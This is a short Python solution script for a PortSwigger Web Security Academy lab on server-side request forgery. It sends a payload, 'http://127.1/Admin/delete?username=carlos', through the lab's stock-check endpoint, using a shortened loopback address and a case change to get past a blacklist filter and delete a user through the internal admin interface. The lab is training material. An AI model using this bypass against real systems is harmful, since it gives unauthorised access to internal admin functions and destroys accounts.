#!/usr/bin/env python

'''
This lab has a stock check feature which fetches data from an internal system.
To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

Lab Link: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter
'''

import requests


lab_id = '0aa400540468c44c823843650015004e' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/product/stock"

# Defeats localhost, 127.0.0.1 check and /admin endpoint check
data = {'stockApi': 'http://127.1/Admin/delete?username=carlos'}

r = requests.post(uri, data=data)
if "Congratulations" in r.text:
    print("solved")
else:
    print("nope")